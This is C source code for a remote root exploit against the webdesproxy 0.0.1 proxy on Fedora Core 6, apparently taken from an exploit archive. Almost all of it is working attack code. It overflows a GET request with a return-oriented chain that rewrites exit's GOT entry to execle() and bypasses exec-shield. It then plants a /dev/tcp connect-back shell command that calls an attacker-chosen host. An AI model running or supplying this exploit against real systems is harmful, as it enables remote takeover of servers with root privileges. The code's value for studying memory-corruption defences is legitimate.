/*
**
** Fedora Core 6 (exec-shield) based
** Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit
** (reverse connect-back method) by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** vendor: http://webdesproxy.sourceforge.net/
**
** vade79/v9 v9@fakehalo.us (fakehalo/realhalo)'s exploit:
** http://fakehalo.us/xwdp-cygwin.c
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** We should focus on uninitialized pb structure variable on .bss.
** This static variable is quite useful. we can put a command to run here.
** We only should be careful for arguments of execle(). 
** A null byte goes after "/bin/sh" and "-c" option in .bss.
**
** --
** execle("/bin/sh\0","/bin/sh\0","-c\0",  conn-back_shell, 0x00000000,     0x00000000);
**                                                        [argument end] [environment ptr]
** --
**
** Also I search for 8bytes of null from stack to define environment variable.
** To get here, I made 13 ret(pop %eip) codes. In case you have different
** stack structure, you may have to change the number of ret code.
** Make sure there are 2 words of null after the arguments and at the position of
** environment pointer.
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

/*
** Fedora Core release 6 (Zod)
** 2.6.18-1.2798.fc6 #1
** locale (GNU libc) 2.5
** gcc version 4.1.1 20061011 (Red Hat 4.1.1-30)
** webdesproxy 0.0.1 tarball src compile (webdesproxy-0.0.1.tgz)
*/

#define EXIT_GOT		0x0804b1a8 // exit GOT
#define EXIT_PLT		0x08048bf8 // exit PLT

#define STRCPY_PLT		0x08048b18 // <strcpy@plt>
#define MOVE_ESP		0x0804aa26 // <__libc_csu_init+102>
#define RET_CODE		0x0804aa73 // <_fini+27>:   ret

#define NULL_STR		0x08050a40 // <pb+4096> (null)

#define EXECLE_16_0xff		0x0804b19a // (execle()>>16)&0xff // fork()
#define EXECLE_08_0xff		0x0804b17d // (execle()>>8)&0xff // bind()
#define EXECLE_00_0xff		0x08048a4f // (execle()>>0)&0xff // <read@plt+7>

/* .bss section */
#define BIN_SH_LOC		0x0804fbcb // <pb+395> struct pb pb; // /bin/sh
#define BIN_SH_END		(BIN_SH_LOC)+7 // <pb+402>
#define C_OPTION_LOC		(BIN_SH_LOC)+8 // <pb+403> // -c
#define C_OPTION_END		(BIN_SH_LOC)+10 // <pb+405>
#define CONN_BACK_LOC		(BIN_SH_LOC)+11 // <pb+406> // conn-back shell

#define RET_CODE_COUNT		13

int main(int argc,char *argv[]){
	int i=0,l=0,sock;
	unsigned char ex_buf[4096];

	struct hostent *se;
	struct sockaddr_in saddr;

	memset((char *)ex_buf,0,sizeof(ex_buf));
	printf("\n Fedora Core 6 (exec-shield) based\n"
		" Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit\n"
		" by Xpl017Elz\n\n");

	if(argc<6){
		printf(" Usage: %s [host] [port] [conn-back host] [input port] [output port]\n",argv[0]);
		printf(" Example: %s webdesproxy.host.co.kr 8080 hax0r.kr 8282 8383\n\n",argv[0]);
		return -1;
	}

	sprintf(ex_buf,"GET http://");
	l=strlen(ex_buf);
	for(i=0;i<220;i++){
		ex_buf[l++]=0x78;
	}
	i=0;

	printf(" [+] make execle() address.\n");
	{
		/* (execle()>>0)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_00_0xff;
		l+=4;
		/* (execle()>>8)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_08_0xff;
		l+=4;
		/* (execle()>>16)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_16_0xff;
		l+=4;
	}
	/* #1 make null byte */
	*(long *)&ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&ex_buf[l]=BIN_SH_END; // "/bin/sh\0"
	l+=4;
	*(long *)&ex_buf[l]=NULL_STR;
	l+=4;

	/* #2 make null byte */
	*(long *)&ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&ex_buf[l]=C_OPTION_END; // "-c\0"
	l+=4;
	*(long *)&ex_buf[l]=NULL_STR;
	l+=4;

	printf(" [+] execle() argument align padddding...\n");
	for(i=0;i<RET_CODE_COUNT;i++){
		*(long *)&ex_buf[l]=RET_CODE; /* ret(pop %eip) code */
		l+=4;
	}

	printf(" [+] make execute command.\n");
	{
		/*
		** --
		** execle("/bin/sh","/bin/sh","-c",conn-back_shell,0x00000000,0x00000000);
		** --
		*/
		*(long *)&ex_buf[l]=EXIT_PLT; /* exit PLT */
		l+=4;
		*(long *)&ex_buf[l]=0x82828282; /* dummy */
		l+=4;
		*(long *)&ex_buf[l]=BIN_SH_LOC; /* argv[0] */
		l+=4;
		*(long *)&ex_buf[l]=BIN_SH_LOC; /* argv[1] */
		l+=4;
		*(long *)&ex_buf[l]=C_OPTION_LOC; /* argv[2] */
		l+=4;
		*(long *)&ex_buf[l]=CONN_BACK_LOC; /* argv[3] */
		l+=4;
	}

	printf(" [+] make connect-back shell command.\n");
	{
		/* overwrite .bss section */
		sprintf(ex_buf+l,"/bin/shx-cxsh</dev/tcp/%s/%d>/dev/tcp/%s/%d;\n",argv[3],atoi(argv[4]),argv[3],atoi(argv[5]));
		l=strlen(ex_buf);
	}

	printf(" [+] connect host: %s:%d.\n",argv[1],atoi(argv[2]));
	se=gethostbyname(argv[1]);
	if(se==NULL){
		printf(" [-] gethostbyname() error.\n\n");
		return -1;
	}
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		printf(" [-] socket() error.\n\n");
		return -1;
	}
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(atoi(argv[2]));
	saddr.sin_addr=*((struct in_addr *)se->h_addr);
	bzero(&(saddr.sin_zero),8);

	i=connect(sock,(struct sockaddr *)&saddr,sizeof(struct sockaddr));
	if(i==-1){
		printf(" [-] connect() error.\n\n");
		return -1;
	}

	printf(" [+] exploit size: %d.\n",l);
	printf(" [+] send exploit.\n");
	send(sock,ex_buf,l,0);
	close(sock);

	printf(" [*] checking, your connect-back host. :-}\n\n");
	exit(0);
}

/* eox */

// milw0rm.com [2007-05-14]
